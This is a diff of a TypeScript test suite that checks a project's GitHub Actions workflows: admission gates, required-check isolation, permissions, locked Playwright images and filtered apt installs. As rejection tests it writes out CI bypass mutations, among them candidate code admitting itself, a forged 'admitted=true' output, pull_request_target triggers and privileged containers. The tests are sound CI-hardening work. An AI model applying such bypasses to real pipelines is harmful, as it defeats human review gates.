-    it('collapses identical withheld pairs while keeping a distinct reason', () => {
-        const identicalRegions = Array.from({ length: 12 }, () => ({
-            path: 'src/hunks.ts',
-            reason: 'region-exceeds-per-region-budget (after)',
-        }));
-        const report = JSON.stringify({
-            execution: 'partial',
-            scope: {
-                discovered: 13,
-                eligible: 13,
-                assessed: 0,
-                cacheHits: 0,
-                excluded: [],
-                unassessed: [...identicalRegions, { path: 'src/hunks.ts', reason: 'evidence-withheld-sensitive-path' }],
-                truncated: [],
-            },
-        });
-        const { coverage, notices, status } = runSemanticCoverageLine({ report });
-        expect(status).toBe(0);
-        expect(coverage).toContain('2 distinct path-and-reason pairs');
-        const annotations = notices.split('\n').filter((line) => line.startsWith('::notice file='));
-        expect(annotations).toHaveLength(2);
-        expect(annotations.join('\n')).toContain('region-exceeds-per-region-budget (after)');
-        expect(annotations.join('\n')).toContain('evidence-withheld-sensitive-path');
-        expect(notices).toContain('0 further distinct path-and-reason pairs were not annotated.');
-    });
-
-    // Three absences that must not read the same. A failed fetch with a line is
-    // a report this run published but could not retrieve; a failed fetch with no
-    // line is a run that published nothing at all; a successful fetch with no
-    // readable report disproves "published nothing" and is its own case. The
-    // never-published branch is exercised with a failed fetch and an empty line,
-    // because a successful download would prove it wrong.
-    it('tells a failed retrieval, a never-published run, and an unreadable report apart', () => {
-        const retrievalFailure = runSemanticCoverageLine({
-            downloadOutcome: 'failure',
-            coverageLine: 'partial · 1 discovered · 1 eligible · 0 assessed · 1 distinct path-and-reason pair',
-        });
-        expect(retrievalFailure.notices).toContain('could not be retrieved');
-        expect(retrievalFailure.notices).not.toContain('No coverage was reported');
-        expect(retrievalFailure.notices).not.toContain('could not be read');
-
-        const neverPublished = runSemanticCoverageLine({ downloadOutcome: 'failure', coverageLine: '' });
-        expect(neverPublished.notices).toContain('No coverage was reported');
-        expect(neverPublished.notices).not.toContain('could not be retrieved');
-        expect(neverPublished.notices).not.toContain('could not be read');
-
-        const emptyArtifact = runSemanticCoverageLine({ downloadOutcome: 'success' });
-        expect(emptyArtifact.notices).toContain('could not be read');
-        expect(emptyArtifact.notices).not.toContain('No coverage was reported');
-        expect(emptyArtifact.notices).not.toContain('could not be retrieved');
-
-        const emptyReport = runSemanticCoverageLine({ report: '', downloadOutcome: 'success' });
-        expect(emptyReport.notices).toContain('could not be read');
-        expect(emptyReport.notices).not.toContain('No coverage was reported');
-    });
     afterEach(() => {
         vi.unstubAllGlobals();
     });
@@ -3130,12 +2463,102 @@ describe('health gates workflow contract', () => {
         const reviewTriggered = cloneWorkflows('review-triggered');
         recordAt(reviewTriggered.health, 'on').pull_request_review = { types: ['submitted'] };
         expect(() => assertRequiredCheckIsolation(reviewTriggered)).toThrow(
-            'health-gates.yml must answer to pull_request alone'
+            'health-gates.yml must answer to labeled pull_request events alone'
         );
+
+        // A second event type reaches Gate on every push again, and a run-completion
+        // trigger runs outside the pull_request event entirely.
+        for (const events of [
+            { pull_request: { types: ['labeled', 'synchronize'] } },
+            { pull_request: { types: ['labeled'] }, workflow_run: { workflows: ['PR checks'] } },
+            { pull_request_target: { types: ['labeled'] } },
+        ]) {
+            const widenedTrigger = cloneWorkflows('widened trigger');
+            widenedTrigger.health.on = events;
+            expect(() => assertRequiredCheckIsolation(widenedTrigger)).toThrow(
+                'health-gates.yml must answer to labeled pull_request events alone'
+            );
+        }
 
         const skippableGate = cloneWorkflows('skippable gate');
         jobAt(skippableGate.health, 'gate').if = '${{ !cancelled() }}';
         expect(() => assertRequiredCheckIsolation(skippableGate)).toThrow('Gate must run after cancellation');
+
+        // Gating the Gate itself on admission would skip it on every unadmitted
+        // label event, and a skipped Gate satisfies the required check.
+        const admissionSkippedGate = cloneWorkflows('admission-skipped gate');
+        jobAt(admissionSkippedGate.health, 'gate').if = ADMITTED_CONDITION;
+        expect(() => assertRequiredCheckIsolation(admissionSkippedGate)).toThrow('Gate must run after cancellation');
+
+        const skippableGateStep = cloneWorkflows('skippable gate step');
+        stepNamed(jobAt(skippableGateStep.health, 'gate'), 'Require selected checks to succeed').if =
+            ADMITTED_CONDITION;
+        expect(() => assertRequiredCheckIsolation(skippableGateStep)).toThrow('Gate must run after cancellation');
+
+        const unadmittedGate = cloneWorkflows('unadmitted gate');
+        const unadmittedNeeds = arrayAt(jobAt(unadmittedGate.health, 'gate'), 'needs');
+        unadmittedNeeds.splice(unadmittedNeeds.indexOf('admission'), 1);
+        expect(() => assertRequiredCheckIsolation(unadmittedGate)).toThrow(
+            'Gate must fail unless approval admission admitted the head'
+        );
+
+        const ungatedHeavyRun = cloneWorkflows('ungated heavy run');
+        delete jobAt(ungatedHeavyRun.health, 'scope').if;
+        expect(() => assertRequiredCheckIsolation(ungatedHeavyRun)).toThrow(
+            'the heavy checks must start only after approval admission admits the head'
+        );
+
+        const bypassingCodeql = cloneWorkflows('bypassing CodeQL');
+        jobAt(bypassingCodeql.health, 'codeql').needs = 'admission';
+        expect(() => assertRequiredCheckIsolation(bypassingCodeql)).toThrow(
+            'health-gates.yml job codeql must wait for approval admission through scope'
+        );
+
+        // Candidate code deciding its own admission: the head could admit itself.
+        const candidateAdmission = cloneWorkflows('candidate admission');
+        recordAt(stepNamed(jobAt(candidateAdmission.health, 'admission'), 'Checkout trusted admission'), 'with').ref =
+            '${{ github.event.pull_request.head.sha }}';
+        expect(() => assertRequiredCheckIsolation(candidateAdmission)).toThrow(
+            'approval admission must decide from the default branch, never the candidate head'
+        );
+
+        // An older head's approval admits when the decision reads any SHA but the event head.
+        const olderHeadAdmission = cloneWorkflows('older-head admission');
+        recordAt(stepNamed(jobAt(olderHeadAdmission.health, 'admission'), 'Decide admission'), 'env').HEAD_SHA =
+            '${{ github.event.pull_request.base.sha }}';
+        expect(() => assertRequiredCheckIsolation(olderHeadAdmission)).toThrow(
+            'approval admission must decide on the event head, label and sender with the trusted script'
+        );
+
+        // Any approval admits when the decision no longer runs the reviewer-identity check.
+        const anyApproverAdmission = cloneWorkflows('any-approver admission');
+        stepNamed(jobAt(anyApproverAdmission.health, 'admission'), 'Decide admission').run =
+            'echo admitted=true >> "$GITHUB_OUTPUT"';
+        expect(() => assertRequiredCheckIsolation(anyApproverAdmission)).toThrow(
+            'approval admission must decide on the event head, label and sender with the trusted script'
+        );
+
+        const softenedAdmission = cloneWorkflows('softened admission');
+        jobAt(softenedAdmission.health, 'admission')['continue-on-error'] = true;
+        expect(() => assertRequiredCheckIsolation(softenedAdmission)).toThrow(
+            'approval admission must not declare continue-on-error'
+        );
+
+        const mintingPushChecks = cloneWorkflows('minting push checks');
+        recordAt(mintingPushChecks.prChecks, 'jobs').gate = jobAt(workflow, 'gate');
+        expect(() => assertRequiredCheckIsolation(mintingPushChecks)).toThrow('pr-checks.yml must not name a job Gate');
+
+        const renamedPushValidation = cloneWorkflows('renamed push validation');
+        jobAt(renamedPushValidation.prChecks, 'validation').name = REQUIRED_CHECK_NAME;
+        expect(() => assertRequiredCheckIsolation(renamedPushValidation)).toThrow(
+            'pr-checks.yml must not name a job Gate'
+        );
+
+        const labeledPushChecks = cloneWorkflows('labeled push checks');
+        labeledPushChecks.prChecks.on = { pull_request: { types: ['opened', 'synchronize', 'labeled'] } };
+        expect(() => assertRequiredCheckIsolation(labeledPushChecks)).toThrow(
+            'pr-checks.yml must answer to pull-request pushes alone'
+        );
 
         const shadowedGate = cloneWorkflows('shadowed gate');
         jobAt(shadowedGate.heavy, 'heavy-gate').name = REQUIRED_CHECK_NAME;
@@ -3205,6 +2628,12 @@ describe('health gates workflow contract', () => {
         );
 
         expect(() => assertWorkflowPermissions(workflow)).not.toThrow();
+        expect(() => assertWorkflowPermissions(prChecksWorkflow)).not.toThrow();
+        expect(prChecksWorkflow.concurrency).toEqual({
+            group: 'pr-checks-${{ github.event.pull_request.number }}',
+            'cancel-in-progress': true,
+        });
+        expect(() => assertNoJobLevelConcurrency(prChecksWorkflow, 'pr-checks.yml')).not.toThrow();
         expect(() => assertWorkflowPermissions(validationWorkflow)).not.toThrow();
         expect(() => assertWorkflowPermissions(heavyWorkflow)).not.toThrow();
         expect(() => assertConcurrencyContract(workflow)).not.toThrow();
@@ -3356,7 +2785,7 @@ describe('health gates workflow contract', () => {
         );
         jobAt(conditionalInventory, 'static').if = CODE_CONDITION;
         expect(() => assertProseSkippingJobs(conditionalInventory)).toThrow(
-            'release inventory answers to prose changes, so static must stay unconditional'
+            'wasm freshness and the script contracts answer to prose-classified changes, so static must stay unconditional'
         );
 
         const alwaysLinting = asRecord(structuredClone(validationWorkflow), 'unconditional lint validationWorkflow');
@@ -3446,7 +2875,6 @@ describe('health gates workflow contract', () => {
         for (const name of [
             'Script types',
             'Format',
-            'Release inventory',
             'Release proof',
             'Agent delivery scripts',
             'Health gate infrastructure',
@@ -3469,8 +2897,12 @@ describe('health gates workflow contract', () => {
         }
         expect(staticSteps).toHaveLength(STEP_INVENTORY['validation.yml']!.static!.length);
         expect(jobAt(validationWorkflow, 'tooling-unit').if).toBe("needs.decide.outputs.tooling == 'true'");
+        // The runner account holds uninspectable same-UID processes, so the guard
+        // storage specs run only in the isolated unit account.
         expect(stringAt(stepNamed(jobAt(validationWorkflow, 'tooling-unit'), 'Run script suite'), 'run')).toBe(
-            "pnpm test:run scripts --exclude='**/releaseProof.spec.ts' --exclude='**/agentDeliveryScripts.spec.ts'"
+            "pnpm test:run scripts --exclude='**/releaseProof.spec.ts' --exclude='**/agentDeliveryScripts.spec.ts'" +
+                " --exclude='**/resourceGuardStorage.spec.ts' --exclude='**/resourceGuard.spec.ts'" +
+                " --exclude='**/resourceGuardShowOutput.spec.ts'"
         );
     });
 
@@ -3544,570 +2976,99 @@ describe('health gates workflow contract', () => {
         );
     });
 
-    it('bounds both halves of every Linux browser install and keeps three attempts inside the job limit', () => {
-        const installs = [
-            {
-                label: 'the offline smoke job',
-                workflow: validationWorkflow,
-                job: 'smoke',
-                nonInstallSeconds: SMOKE_NON_INSTALL_SECONDS,
-                declaredJobMinutes: SMOKE_JOB_MINUTES,
-            },
-            {
-                label: 'the affected end-to-end job',
-                workflow: heavyWorkflow,
-                job: 'e2e',
-                nonInstallSeconds: E2E_SHARD_NON_INSTALL_SECONDS,
-                declaredJobMinutes: E2E_JOB_MINUTES,
-            },
-            {
-                label: 'the nightly end-to-end job',
-                workflow: nightly,
-                job: 'e2e',
-                nonInstallSeconds: E2E_SHARD_NON_INSTALL_SECONDS,
-                declaredJobMinutes: E2E_JOB_MINUTES,
-            },
+    it('uses the locked preinstalled runtime and rejects browser acquisition in every Linux browser job', () => {
+        for (const [label, workflow, job] of [
+            ['the offline smoke job', validationWorkflow, 'smoke'],
+            ['the affected end-to-end job', heavyWorkflow, 'e2e'],
+            ['the nightly end-to-end job', nightly, 'e2e'],
+        ] as const) {
+            const minutes = job === 'smoke' ? SMOKE_JOB_MINUTES : E2E_JOB_MINUTES;
+            const check = (candidate: UnknownRecord) =>
+                assertContainerBrowserRuntime(jobAt(candidate, job), label, minutes);
+            expect(() => check(workflow)).not.toThrow();
+            for (const image of [
+                `mcr.microsoft.com/playwright:v1.62.0-noble@${PLAYWRIGHT_IMAGE_DIGEST}`,
+                'mcr.microsoft.com/playwright:v1.63.0-noble',
+                `mcr.microsoft.com/playwright:v1.63.0-noble@sha256:${'0'.repeat(64)}`,
+            ]) {
+                const mismatch = structuredClone(workflow);
+                recordAt(jobAt(mismatch, job), 'container').image = image;
+                expect(() => check(mismatch)).toThrow('must use the locked Playwright image and digest');
+            }
+            for (const command of [
+                'sudo env "PATH=$PATH" bash scripts/aptWithoutMicrosoftFeed.sh --deadline 8m -- node_modules/.bin/playwright install-deps chromium',
+                'pnpm exec playwright install chromium',
+                'apt-get install -y libnss3',
+            ]) {
+                const acquisition = structuredClone(workflow);
+                const install = stepNamed(jobAt(acquisition, job), 'Install dependencies');
+                install.run = `${stringAt(install, 'run')}\n${command}`;
+                expect(() => check(acquisition)).toThrow('must not acquire browser packages or binaries at runtime');
+            }
+            const privileged = structuredClone(workflow);
+            const container = recordAt(jobAt(privileged, job), 'container');
+            container.options = `${stringAt(container, 'options')} --privileged`;
+            expect(() => check(privileged)).toThrow('without extra container authority');
+            const wrongShell = structuredClone(workflow);
+            jobAt(wrongShell, job).defaults = { run: { shell: 'sh' } };
+            expect(() => check(wrongShell)).toThrow('must preserve bash');
+            const noLaunch = structuredClone(workflow);
+            stepNamed(jobAt(noLaunch, job), BROWSER_RUNTIME_STEP).run = 'pnpm exec playwright --version';
+            expect(() => check(noLaunch)).toThrow('must launch and check the resolved browser');
+            const conditional = structuredClone(workflow);
+            stepNamed(jobAt(conditional, job), BROWSER_RUNTIME_STEP).if = 'false';
+            expect(() => check(conditional)).toThrow('without conditional admission');
+        }
+    });
+
+    it('runs one bounded ALSA transaction with fatal failure in each Rust route', () => {
+        for (const [label, workflow] of [
+            ['the validation Rust job', validationWorkflow],
+            ['the nightly Rust job', nightly],
+        ] as const) {
+            const check = (candidate: UnknownRecord) => assertBoundedAlsaInstall(jobAt(candidate, 'rust'), label);
+            expect(() => check(workflow)).not.toThrow();
+            const duplicate = asRecord(structuredClone(workflow), `duplicate ${label}`);
+            const step = stepNamed(jobAt(duplicate, 'rust'), 'Install ALSA development headers');
+            step.run = `${stringAt(step, 'run')}${ALSA_INSTALL_COMMAND}\n`;
+            expect(() => check(duplicate)).toThrow('must run one bounded ALSA transaction and propagate its failure');
+            const missingDeadline = asRecord(structuredClone(workflow), `missing deadline ${label}`);
+            const missingStep = stepNamed(jobAt(missingDeadline, 'rust'), 'Install ALSA development headers');
+            missingStep.run = stringAt(missingStep, 'run').replace('--deadline 8m --', '--');
+            expect(() => check(missingDeadline)).toThrow(
+                'must run the ALSA header install through the Microsoft apt feed filter'
+            );
+        }
+    });
+
+    it('runs every hosted apt route through the Microsoft apt feed filter', () => {
+        expect(() => assertAptRoutesFiltered(workflowSet())).not.toThrow();
+
+        const routes: ReadonlyArray<readonly [keyof WorkflowSet, string, string, string]> = [
+            ['validation', 'validation.yml', 'rust', 'Install ALSA development headers'],
+            ['nightly', 'nightly.yml', 'rust', 'Install ALSA development headers'],
+            ['cargoDependencySeed', 'cargo-dependency-seed.yml', 'rust', 'Install ALSA development headers'],
+            ['hostedQuantumMeasurement', 'quantum-measurements.yml', 'measure', 'Install Google Chrome'],
         ];
-        const unwrappedRoot = ROOT_DEPENDENCY_INSTALL_COMMAND.replace(
-            `sudo env "PATH=$PATH" timeout --kill-after=${INSTALL_KILL_AFTER_SECONDS}s ${ROOT_DEPENDENCY_CAP_MINUTES}m `,
-            'sudo '
+        for (const [key, file, jobId, stepName] of routes) {
+            const unfiltered = cloneWorkflows(`unfiltered ${file} ${jobId}`);
+            const step = stepNamed(jobAt(unfiltered[key], jobId), stepName);
+            const run = stringAt(step, 'run');
+            expect(run).toContain(APT_FEED_FILTER);
+            step.run = run.replace(`${APT_FEED_FILTER} `, '');
+            expect(() => assertAptRoutesFiltered(unfiltered)).toThrow(
+                `${file} job ${jobId} step ${stepName} must run apt through the Microsoft apt feed filter`
+            );
+        }
+
+        const addedRoute = cloneWorkflows('added unfiltered apt route');
+        arrayAt(jobAt(addedRoute.validation, 'lint'), 'steps').push({
+            name: 'Install a package',
+            run: 'sudo apt-get install -y jq',
+        });
+        expect(() => assertAptRoutesFiltered(addedRoute)).toThrow(
+            'validation.yml job lint step Install a package must run apt through the Microsoft apt feed filter'
         );
-        const rootRunAsRunner = ROOT_DEPENDENCY_INSTALL_COMMAND.replace('sudo env "PATH=$PATH" ', '');
-
-        for (const { label, workflow, job, nonInstallSeconds, declaredJobMinutes } of installs) {
-            const check = (candidate: UnknownRecord): void => {
-                assertBoundedBrowserInstall(jobAt(candidate, job), label, nonInstallSeconds, declaredJobMinutes);
-            };
-            const mutate = (name: string, change: (target: UnknownRecord) => void): UnknownRecord => {
-                const clone = asRecord(structuredClone(workflow), `${name} ${label}`);
-                change(jobAt(clone, job));
-                return clone;
-            };
-            const rewriteInstall = (name: string, rewrite: (run: string) => string): UnknownRecord =>
-                mutate(name, (target) => {
-                    const step = stepNamed(target, 'Install Playwright browsers');
-                    step.run = rewrite(stringAt(step, 'run'));
-                });
-
-            expect(() => check(workflow)).not.toThrow();
-
-            expect(() =>
-                check(
-                    rewriteInstall('unbounded root', (run) =>
-                        run.replace(ROOT_DEPENDENCY_INSTALL_COMMAND, unwrappedRoot)
-                    )
-                )
-            ).toThrow(`${label} must bound the root dependency install from the root side with sudo timeout`);
-
-            expect(() =>
-                check(
-                    rewriteInstall('runner-owned root timeout', (run) =>
-                        run.replace(ROOT_DEPENDENCY_INSTALL_COMMAND, rootRunAsRunner)
-                    )
-                )
-            ).toThrow(`${label} must bound the root dependency install from the root side with sudo timeout`);
-
-            expect(() =>
-                check(
-                    rewriteInstall('unbounded browser download', (run) =>
-                        run.replace(USER_BROWSER_INSTALL_COMMAND, 'pnpm exec playwright install chromium')
-                    )
-                )
-            ).toThrow(`${label} must bound the browser download with its own timeout`);
-
-            expect(() =>
-                check(
-                    rewriteInstall(
-                        'coupled dependencies',
-                        (run) => `${run}\npnpm exec playwright install --with-deps chromium`
-                    )
-                )
-            ).toThrow(`${label} must not install system dependencies through the runner-user browser install`);
-
-            expect(() =>
-                check(
-                    rewriteInstall('single attempt', (run) => run.replace('for attempt in 1 2 3', 'for attempt in 1'))
-                )
-            ).toThrow(`${label} must retry browser and dependency installation against mirror outages`);
-
-            const requiredMinutes = requiredBrowserInstallJobMinutes(nonInstallSeconds);
-            expect(jobAt(workflow, job)['timeout-minutes']).toBeGreaterThanOrEqual(requiredMinutes);
-            const justBelowLimit = mutate('limit just below the requirement', (target) => {
-                target['timeout-minutes'] = requiredMinutes - 1;
-            });
-            expect(() => check(justBelowLimit)).toThrow(
-                `${label} must have a job limit that holds three timed-out install attempts and its other steps`
-            );
-            expect(declaredJobMinutes).toBeGreaterThanOrEqual(requiredMinutes);
-            const pinMessage = `${label} must keep its job limit at exactly ${declaredJobMinutes} minutes`;
-            const justAboveLimit = mutate('limit just above the declaration', (target) => {
-                target['timeout-minutes'] = declaredJobMinutes + 1;
-            });
-            expect(() => check(justAboveLimit)).toThrow(pinMessage);
-            const defaultLimit = mutate('GitHub default limit', (target) => {
-                target['timeout-minutes'] = 360;
-            });
-            expect(() => check(defaultLimit)).toThrow(pinMessage);
-            const unlimited = mutate('absent limit', (target) => {
-                delete target['timeout-minutes'];
-            });
-            expect(() => check(unlimited)).toThrow(
-                `${label} must have a job limit that holds three timed-out install attempts and its other steps`
-            );
-        }
-    });
-
-    it('bounds, retries and fails every ALSA header install inside its step and job limits', () => {
-        const installs = [
-            { label: 'the validation Rust job', workflow: validationWorkflow },
-            { label: 'the nightly Rust job', workflow: nightly },
-        ];
-
-        for (const { label, workflow } of installs) {
-            const check = (candidate: UnknownRecord): void => {
-                assertBoundedAlsaInstall(jobAt(candidate, 'rust'), label);
-            };
-            const mutate = (name: string, change: (target: UnknownRecord) => void): UnknownRecord => {
-                const clone = asRecord(structuredClone(workflow), `${name} ${label}`);
-                change(jobAt(clone, 'rust'));
-                return clone;
-            };
-            const rewriteInstall = (name: string, rewrite: (run: string) => string): UnknownRecord =>
-                mutate(name, (target) => {
-                    const step = stepNamed(target, 'Install ALSA development headers');
-                    step.run = rewrite(stringAt(step, 'run'));
-                });
-
-            expect(() => check(workflow)).not.toThrow();
-
-            expect(() =>
-                check(
-                    rewriteInstall('unbounded attempt', (run) =>
-                        run.replace(
-                            ALSA_INSTALL_COMMAND,
-                            'sudo apt-get update && sudo apt-get install -y libasound2-dev'
-                        )
-                    )
-                )
-            ).toThrow(`${label} must bound each ALSA install attempt from the root side with sudo timeout`);
-
-            expect(() =>
-                check(
-                    rewriteInstall('runner-owned timeout', (run) =>
-                        run.replace(ALSA_INSTALL_COMMAND, ALSA_INSTALL_COMMAND.replace('sudo timeout', 'timeout'))
-                    )
-                )
-            ).toThrow(`${label} must bound each ALSA install attempt from the root side with sudo timeout`);
-
-            expect(() =>
-                check(
-                    rewriteInstall('single attempt', (run) => run.replace('for attempt in 1 2 3', 'for attempt in 1'))
-                )
-            ).toThrow(`${label} must retry the ALSA header install against mirror outages`);
-
-            expect(() =>
-                check(rewriteInstall('swallowed failure', (run) => run.replace(/\nexit 1\s*$/, '\n')))
-            ).toThrow(`${label} must fail the step after the third failed ALSA install attempt`);
-
-            const justBelowLimit = mutate('step limit just below the requirement', (target) => {
-                stepNamed(target, 'Install ALSA development headers')['timeout-minutes'] = Math.floor(
-                    ALSA_INSTALL_WORST_CASE_SECONDS / 60
-                );
-            });
-            expect(() => check(justBelowLimit)).toThrow(
-                `${label} must carry a step limit that holds three timed-out ALSA attempts and backoff`
-            );
-
-            const unlimited = mutate('absent step limit', (target) => {
-                delete stepNamed(target, 'Install ALSA development headers')['timeout-minutes'];
-            });
-            expect(() => check(unlimited)).toThrow(
-                `${label} must carry a step limit that holds three timed-out ALSA attempts and backoff`
-            );
-
-            const stepAtJobLimit = mutate('step limit at the job limit', (target) => {
-                stepNamed(target, 'Install ALSA development headers')['timeout-minutes'] = Number(
-                    target['timeout-minutes']
-                );
-            });
-            expect(() => check(stepAtJobLimit)).toThrow(`${label} must keep the ALSA step limit below its job limit`);
-        }
-    });
-
-    const MAX_ALSA_PROBE_STDERR_CHARACTERS = 1_000;
-    const ALSA_PROBE_TIMEOUT_MS = 1_000;
-    const alsaCommandFunctions = `
-sudo() { "$@"; }
-timeout() { shift 2; "$@"; }
-sleep() { printf '%s\\n' "$1" >> "$SLEEP_LOG"; }
-apt-get() {
-  if [ "$1" = update ]; then
-    if [ "\${STALL_ALSA_CHILD:-false}" = true ]; then
-      trap '' TERM
-      exec 2>/dev/null
-      printf '%s\\n' "$$" > "$STALL_ALSA_PID_FILE"
-      while :; do :; done
-    fi
-    attempt_count=0
-    while IFS= read -r _; do attempt_count=$((attempt_count + 1)); done < "$ATTEMPT_LOG"
-    attempt_count=$((attempt_count + 1))
-    printf 'attempt\\n' >> "$ATTEMPT_LOG"
-    [ "$attempt_count" -ge "$SUCCEED_ON_ATTEMPT" ] || return 100
-  fi
-}
-export -f sudo timeout sleep apt-get
-`;
-
-    type AlsaProbeResult = {
-        attempts: number;
-        sleeps: string[];
-        status: number | null;
-        signal: NodeJS.Signals | null;
-        errorCode: string | null;
-        stderr: string;
-        error: Error | undefined;
-    };
-
-    const boundedAlsaProbeStderr = (stderr: string): string => stderr.slice(0, MAX_ALSA_PROBE_STDERR_CHARACTERS);
-
-    const requireOwnedPid = (pid: number): void => {
-        if (!Number.isSafeInteger(pid) || pid <= 1) {
-            throw new Error(`ALSA probe has no safe owned process ID: ${pid}`);
-        }
-    };
-
-    type OwnedProcessGroup = { pid: number | undefined };
-
-    const processGroupAlive = (group: OwnedProcessGroup): boolean => {
-        const pid = group.pid;
-        if (pid === undefined) {
-            return false;
-        }
-        requireOwnedPid(pid);
-        try {
-            process.kill(-pid, 0);
-            return true;
-        } catch (error) {
-            const code = (error as NodeJS.ErrnoException).code;
-            if (code === 'ESRCH') {
-                group.pid = undefined;
-                return false;
-            }
-            if (code === 'EPERM') {
-                return true;
-            }
-            throw new Error(`ALSA probe cannot inspect owned process group ${pid}: ${String(error)}`, { cause: error });
-        }
-    };
-
-    const signalProcessGroup = (group: OwnedProcessGroup, signal: NodeJS.Signals): void => {
-        const pid = group.pid;
-        if (pid === undefined) {
-            return;
-        }
-        requireOwnedPid(pid);
-        try {
-            process.kill(-pid, signal);
-        } catch (error) {
-            const code = (error as NodeJS.ErrnoException).code;
-            if (code === 'ESRCH') {
-                group.pid = undefined;
-                return;
-            }
-            if (code !== 'EPERM') {
-                throw new Error(`ALSA probe cannot signal owned process group ${pid}: ${String(error)}`, {
-                    cause: error,
-                });
-            }
-        }
-    };
-
-    const waitForProcessGroupExit = async (group: OwnedProcessGroup): Promise<void> => {
-        const deadline = Date.now() + 2_000;
-        while (processGroupAlive(group) && Date.now() < deadline) {
-            await new Promise((resolve) => setTimeout(resolve, 25));
-        }
-        if (processGroupAlive(group)) {
-            throw new Error(`ALSA probe process group ${group.pid} survived SIGKILL; fixture retained`);
-        }
-    };
-
-    const describeAlsaProbeFailure = (result: AlsaProbeResult): string =>
-        `ALSA probe child failed: error=${result.errorCode ?? 'none'}; status=${result.status ?? 'null'}; ` +
-        `signal=${result.signal ?? 'none'}; stderr=${boundedAlsaProbeStderr(result.stderr) || '(empty)'}`;
-
-    // Executes the published ALSA loop with exported Bash functions so every
-    // command stays hermetic while the real nested `bash -c` and retry branches run.
-    const runAlsaInstall = async (
-        run: string,
-        succeedOnAttempt: number,
-        options: { stallChild?: boolean; timeoutMs?: number; ownedGroup?: OwnedProcessGroup } = {}
-    ): Promise<AlsaProbeResult> => {
-        const probeDirectory = mkdtempSync(join(tmpdir(), 'sourdaw-alsa-install-'));
-        const attemptLog = join(probeDirectory, 'attempts.log');
-        const sleepLog = join(probeDirectory, 'sleeps.log');
-        const stalledPidFile = join(probeDirectory, 'stalled.pid');
-        const preludePath = join(probeDirectory, 'functions.bash');
-        let groupPid: number | undefined;
-        const ownedGroup = options.ownedGroup ?? { pid: undefined };
-        try {
-            writeFileSync(preludePath, alsaCommandFunctions);
-            writeFileSync(attemptLog, '');
-            writeFileSync(sleepLog, '');
-            const child = spawn('bash', ['-c', run], {
-                detached: true,
-                stdio: ['ignore', 'ignore', 'pipe'],
-                env: {
-                    ...process.env,
-                    BASH_ENV: preludePath,
-                    ATTEMPT_LOG: attemptLog,
-                    SLEEP_LOG: sleepLog,
-                    SUCCEED_ON_ATTEMPT: String(succeedOnAttempt),
-                    STALL_ALSA_CHILD: String(options.stallChild ?? false),
-                    STALL_ALSA_PID_FILE: stalledPidFile,
-                },
-            });
-            groupPid = child.pid;
-            ownedGroup.pid = groupPid;
-            let stderr = '';
-            let childError: NodeJS.ErrnoException | undefined;
-            let timedOut = false;
-            child.stderr?.setEncoding('utf8');
-            child.stderr?.on('data', (chunk: string) => {
-                stderr = boundedAlsaProbeStderr(stderr + chunk);
-            });
-            child.once('error', (error: NodeJS.ErrnoException) => {
-                childError = error;
-            });
-            const closed = new Promise<{ status: number | null; signal: NodeJS.Signals | null }>((resolve) => {
-                child.once('close', (status, signal) => resolve({ status, signal }));
-            });
-            let resolveDeadline: (() => void) | undefined;
-            const deadlineReached = new Promise<void>((resolve) => {
-                resolveDeadline = resolve;
-            });
-            const timeout = setTimeout(() => {
-                timedOut = true;
-                signalProcessGroup(ownedGroup, 'SIGTERM');
-                resolveDeadline?.();
-            }, options.timeoutMs ?? ALSA_PROBE_TIMEOUT_MS);
-            const killAfter = setTimeout(
-                () => {
-                    if (timedOut && processGroupAlive(ownedGroup)) {
-                        signalProcessGroup(ownedGroup, 'SIGKILL');
-                    }
-                },
-                (options.timeoutMs ?? ALSA_PROBE_TIMEOUT_MS) + 200
-            );
-            let closedResult: Awaited<typeof closed>;
-            try {
-                const closedBeforeDeadline = await Promise.race([
-                    closed.then(() => true),
-                    deadlineReached.then(() => false),
-                ]);
-                if (closedBeforeDeadline) {
-                    clearTimeout(timeout);
-                }
-                if (timedOut) {
-                    await waitForProcessGroupExit(ownedGroup);
-                }
-                closedResult = await closed;
-                if (!timedOut && processGroupAlive(ownedGroup)) {
-                    signalProcessGroup(ownedGroup, 'SIGKILL');
-                    await waitForProcessGroupExit(ownedGroup);
-                    throw new Error(`ALSA probe process group ${groupPid} outlived its direct child`);
-                }
-            } finally {
-                clearTimeout(timeout);
-                clearTimeout(killAfter);
-            }
-            const outcome: AlsaProbeResult = {
-                attempts: 0,
-                sleeps: [],
-                status: closedResult.status,
-                signal: closedResult.signal,
-                errorCode: timedOut ? 'ETIMEDOUT' : (childError?.code ?? null),
-                stderr,
-                error: childError,
-            };
-            if (timedOut || outcome.error !== undefined || outcome.status === null || outcome.signal !== null) {
-                throw new Error(describeAlsaProbeFailure(outcome));
-            }
-            const lines = (path: string): string[] => readFileSync(path, 'utf8').split('\n').filter(Boolean);
-            return { ...outcome, attempts: lines(attemptLog).length, sleeps: lines(sleepLog) };
-        } catch (error) {
-            if (!(error instanceof Error)) {
-                throw error;
-            }
-            const rawStalledPid = existsSync(stalledPidFile) ? readFileSync(stalledPidFile, 'utf8').trim() : '';
-            const stalledPid = Number(rawStalledPid);
-            throw Object.assign(error, {
-                probeDirectory,
-                groupPid,
-                stalledPid: Number.isSafeInteger(stalledPid) && stalledPid > 1 ? stalledPid : undefined,
-            });
-        } finally {
-            if (!processGroupAlive(ownedGroup)) {
-                rmSync(probeDirectory, { force: true, recursive: true });
-            }
-        }
-    };
-
-    for (const { label, workflow } of [
-        { label: 'the validation Rust job', workflow: validationWorkflow },
-        { label: 'the nightly Rust job', workflow: nightly },
-    ]) {
-        const alsaRun = stringAt(stepNamed(jobAt(workflow, 'rust'), 'Install ALSA development headers'), 'run');
-        const assertExhaustionContract = (outcome: AlsaProbeResult): void => {
-            expect(outcome.attempts).toBe(3);
-            expect(outcome.sleeps).toEqual(['15', '30']);
-            expect(outcome.status).toBe(1);
-            expect(outcome.stderr).toContain('ALSA header install failed (attempt 3/3)');
-        };
-
-        it(`${label} makes three ALSA install attempts, then fails the step`, async () => {
-            const outcome = await runAlsaInstall(alsaRun, Number.MAX_SAFE_INTEGER);
-            assertExhaustionContract(outcome);
-        });
-
-        it(`${label} stops retrying the ALSA install once an attempt succeeds`, async () => {
-            const outcome = await runAlsaInstall(alsaRun, 2);
-            expect(outcome.attempts).toBe(2);
-            expect(outcome.sleeps).toEqual(['15']);
-            expect(outcome.status).toBe(0);
-        });
-
-        it(`${label} retry oracle rejects a loop with its later attempts removed`, async () => {
-            const oneAttempt = alsaRun.replace('for attempt in 1 2 3; do', 'for attempt in 1; do');
